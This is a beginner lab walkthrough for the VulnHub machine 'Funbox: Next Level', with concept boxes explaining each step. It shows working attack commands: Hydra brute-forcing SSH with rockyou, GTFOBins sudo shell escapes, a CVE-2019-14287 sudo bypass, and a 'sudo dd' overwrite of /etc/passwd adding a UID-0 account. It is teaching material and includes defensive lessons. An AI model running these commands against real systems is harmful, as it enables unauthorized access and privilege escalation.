# Funbox: Next Level — VulnHub Walkthrough (Beginner Friendly)

> A deliberately misleading "Drupal" directory, a WordPress site hiding behind an
> unreachable redirect, and a `sudo dd` privilege escalation. The hint says it
> all: *"The first impression is not always the right one!"*

| Field | Value |
| --- | --- |
| **Machine** | Funbox: Next Level (Funbox 5) |
| **Difficulty** | Easy |
| **Author** | [0815R2d2](https://twitter.com/0815R2d2) |
| **Released** | 5 Sep 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-next-level,547/ |
| **Download** | https://vulnhub.com/entry/funbox-next-level,547/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Debian) |

> **Lab note:** This machine works best with **VirtualBox** rather than VMware.
> Your target IP will differ — replace `192.168.56.101` with whatever your own
> lab gives you.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to deal with a web server that redirects you to an **unreachable IP**.
- Bypassing broken redirects with `wfuzz` and `wpscan --ignore-main-redirect`.
- Using **Hydra** to brute-force SSH vs. brute-forcing WordPress logins.
- Reading files on a box where `cat`, `head` and `tail` have been removed.
- Using **`sudo dd`** (a GTFOBins classic) to overwrite `/etc/passwd` and add a
  new root user.

---

## 1. Reconnaissance — finding the target

First, discover the target's IP address. From Kali:


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:01      1      60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:a1:b2:c3      2     120  PCS Systemtechnik GmbH
```

> **Why it works:** `netdiscover` sends ARP requests and listens for replies, so
> it finds hosts on your local segment even before you know their IPs. Our target
> is `192.168.56.101`.

![netdiscover output](images/01-netdiscover.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- 192.168.56.101 -oN nmap.txt
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

Only **SSH** and **HTTP** are open — the hint is clearly about the website.

> **Why it works:** `-sC` runs default scripts, `-sV` fingerprints versions, and
> `-p-` scans all 65535 ports. Knowing exact versions helps you find the right
> attack later.

![nmap scan](images/02-nmap.png)

### Directory brute force


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/dirb/wordlists/common.txt
```

```text
/drupal             (Status: 301) [--> http://192.168.56.101/drupal/]
/server-status      (Status: 403)
```

A `/drupal` directory! Naturally, you would try to open it — and that is exactly
where the trap is:

![drupal redirect hang](images/03-drupal-redirect.png)

Visiting `http://192.168.56.101/drupal` makes the browser **hang** while it tries
to reach `192.168.178.33` — an IP that does not exist on your network. Because
the page redirects there, `gobuster` also times out:

```text
Error: the server returns a redirect that cannot be followed
```

The hint is now literal: **the first impression is not always the right one**.

---

## 3. Foothold — gaining the first shell

### Bypass the redirect with wfuzz

`wfuzz` does not care that the redirect is broken — it reads the response size
directly. `--hh 274` hides any result whose body is 274 bytes long (the "invalid
redirect" default page), leaving only interesting hits:

```bash
wfuzz -c --hh 274 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
  http://192.168.56.101/drupal/FUZZ.php
```

```text
000000124:   200        0 L      0 W      0 Ch        "index"
000000287:   200        0 L      0 W      0 Ch        "wp-login"
000000501:   301        9 L      28 W      315 Ch      "wp-admin"
```

`wp-login.php` — this is **WordPress** hiding inside a folder called `drupal`.

> **Why it works:** `--hh` filters out the noise. The presence of `wp-login.php`
> tells us the "Drupal" folder is actually a WordPress install.

### Enumerate WordPress users

`wpscan` has a switch to follow redirects that would otherwise break it:


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://192.168.56.101/drupal --ignore-main-redirect --force -e u
```

```text
[i] User(s) Identified:
[+] admin
[+] ben
```

> **Why it works:** `-e u` enumerates users (through the REST API, author
> archives, etc.). `--ignore-main-redirect` stops wpscan choking on the broken
> redirect.

### Brute-force SSH (not WordPress)

A WordPress password attack stalls because of the redirect, so pivot to SSH
directly. `ben` is a real system account, so try Hydra against port 22:


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
hydra -l ben -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: ben   password: <found>
1 of 1 target successfully completed, 1 valid password found
```

```bash
ssh ben@192.168.56.101
```

> **Why it works:** Users found in WordPress are often the *same* Linux accounts.
> SSH is far more reliable to brute force here than the redirect-broken login
> form.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### A box with no `cat`, no `head`, no `tail`

Once you are `ben`, normal file reading fails:

```bash
ben@funbox5:~$ cat /etc/passwd
-bash: cat: command not found
```

> **Why it works:** In a real engagement, a crippled shell is a nuisance, not a
> wall. Python reaches the same files:

```bash
ben@funbox5:~$ python3 -c 'import sys; sys.stdout.write(sys.stdin.read())' < /etc/passwd
```

### Read Ben's mail for Adam's credentials

```bash
ben@funbox5:~$ python3 -c 'import sys; sys.stdout.write(sys.stdin.read())' < /var/mail/ben
```

```text
Hi Ben,

please come to my office at 10:00 a.m. We have a lot to talk about!
The new employees must be created. Ive already finished Adam.

CREDS FOR ADAM:  adam:<password>
```

> **Why it works:** Local mailboxes on CTF boxes are a classic credential stash.
> On this build they are in `/var/mail/`. Use the password to switch user:

```bash
ben@funbox5:~$ su adam
```

### Check Adam's sudo rights


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
adam@funbox5:~$ sudo -l
```

```text
User adam may run the following commands on funbox5:
    (root) PASSWD: /bin/dd
    (root) PASSWD: /bin/de
    (root) PASSWD: /bin/df
```

`dd` as root is the way in. According to [GTFOBins](https://gtfobins.github.io/gtfobins/dd/),
`dd` can read and write arbitrary privileged files.

> **Why it works:** The `PASSWD` flag usually means a password is required, but
> the point is that **root owns the operation** — so any file `dd` writes is
> written as root.

### Overwrite `/etc/passwd` with a new root user

Generate a password hash for your own fake account:


> ### 📖 Concept — The `/etc/passwd` overwrite trick
>
> Historically Linux stored password hashes in `/etc/passwd` field 2. Today they live
> in `/etc/shadow` (root-only) and field 2 of `/etc/passwd` holds a literal `x`
> placeholder. **But the login code still honours a real hash in field 2 if one is
> there.** So if you can *write* `/etc/passwd` — via a SUID `cp`/`wget`, a writable
> file, an NFS export, or a MySQL `dumpfile` — you can append:
>
> ```text
> ignite:<hash-of-a-password-I-chose>:0:0:root:/root:/bin/bash
> ```
>
> and `su ignite` gives you a **root** shell.
>
> **The seven colon-separated fields:**
>
> | # | Field | Value | Why |
> | --- | --- | --- | --- |
> | 1 | username | `ignite` | What you `su` to |
> | 2 | password | `$1$ignite$3eTbJm98O9Hz…` | A **real hash**, not `x` — so `su` authenticates against `/etc/passwd` directly, with no `/etc/shadow` entry needed |
> | 3 | **UID** | **`0`** | **UID 0 *is* root.** This single number is the entire trick — the username is irrelevant. |
> | 4 | GID | `0` | The `root` group |
> | 5 | GECOS | `root` | Comment field, ignored |
> | 6 | home | `/root` | |
> | 7 | shell | `/bin/bash` | Must be a real shell or login fails |
>
> Generate the hash yourself:
>
> ```bash
> openssl passwd -1 -salt ignite pass123      # -1 = MD5-crypt, $1$
> openssl passwd -6 -salt ignite pass123      # -6 = SHA-512-crypt, $6$
> ```
>
> > ⚠️ **Always regenerate this hash. Never copy one from a writeup — including this
> > one.** MD5-crypt output is exactly **22 characters** after the final `$`. Values
> > transcribed into blog posts are frequently mistyped, and a 21-character hash
> > fails silently with `Authentication failure`, sending you debugging in entirely
> > the wrong direction. Verify with
> > `python3 -c "import crypt; print(crypt.crypt('pass123','$1$ignite'))"`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files and directories](../../docs/CONCEPTS.md#156-writable-files-and-directories)

```bash
adam@funbox5:/tmp$ openssl passwd mrcake
7.wfjKUb48CxM
```

Copy `/etc/passwd` to a temporary file (using `dd` as root), append one line, and
write it back over the real file:

```bash
adam@funbox5:/tmp$ sudo -u root /bin/dd if=/etc/passwd of=passwd_copy
adam@funbox5:/tmp$ echo 'root2:7.wfjKUb48CxM:0:0:root:/root:/bin/bash' >> passwd_copy
adam@funbox5:/tmp$ sudo -u root /bin/dd if=passwd_copy of=/etc/passwd
```

```text
4+1 records in
4+1 records out
2065 bytes (2.1 kB, 2.0 KiB) copied
```

Now switch to the account you just created:

```bash
adam@funbox5:/tmp$ su root2
Password:            # mrcake
root@funbox5:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@funbox5:~# cat /root/flag.txt
```

> **Why it works:** The `/etc/passwd` format is
> `username:password:uid:gid:comment:home:shell`. The `password` field accepts a
> **hash** (from `openssl passwd`). Setting `uid=0` makes the account
> **root-equivalent**, and `su root2` reads the hash, verifies your typed
> password, and hands over a root shell.

![root shell](images/05-root.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Misleading web directory / broken redirect used as a mild obfuscation | `/drupal` | Enumeration obstacle only |
| 2 | WordPress user enumeration | `/drupal/wp-login.php` | Usernames `ben`, `admin` leaked |
| 3 | Weak SSH password for `ben` | SSH (22) | Initial foothold |
| 4 | Credentials left in a local mailbox | `/var/mail/ben` | `adam` account compromised |
| 5 | Over-permissive `sudo` on `dd` | `sudo -l` | `/etc/passwd` overwrite → root |
| 6 | Crippled shell-based "security" by removing binaries | PATH | Trivially bypassed with Python |

---

## 6. Defensive lessons (blue team)

- **Do not rely on hidden paths or broken redirects** for security. Enumeration
  tools tolerate them; the only thing they stop is honest users.
- **WordPress leaks usernames** by default. Disable author enumeration and the
  REST API user endpoint, or put the site behind authentication.
- **Strong, unique passwords** defeat Hydra. Use long passphrases and MFA/keys.
- **Do not store credentials in `/var/mail`.** Ever.
- **Never grant `sudo` on file-manipulation tools** (`dd`, `install`, `tee`) —
  they can overwrite `/etc/passwd` and `/etc/shadow` and hand over root. Prefer
  scoped, argument-limited `sudoers` rules (e.g. `Cmnd_Alias` with fixed paths).
- **Removing `cat`/`head`/`tail` is not a control.** Interpreters (`python3`,
  `perl`, `php`) and builtins (`while read`) read the same files.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: https://vulnhub.com/entry/funbox-next-level,547/
- "An ordinary day" walkthrough: https://blog.gibbons.digital/hacking/2020/10/01/nextlevel.html
- GTFOBins — `dd`: https://gtfobins.github.io/gtfobins/dd/
- WPScan: https://github.com/wpscanteam/wpscan
- Hydra: https://github.com/vanhauser-thc/thc-hydra

---

## 8. Screenshot checklist

| # | File | What to capture |
| --- | --- | --- |
| 1 | `images/01-netdiscover.png` | Target IP from `netdiscover` |
| 2 | `images/02-nmap.png` | Nmap results (22 + 80) |
| 3 | `images/03-drupal-redirect.png` | Browser hanging on the `/drupal` redirect |
| 4 | `images/04-wpscan.png` | wpscan user enumeration (`ben`, `admin`) |
| 5 | `images/05-root.png` | `id` returning `uid=0(root)` after `su root2` |
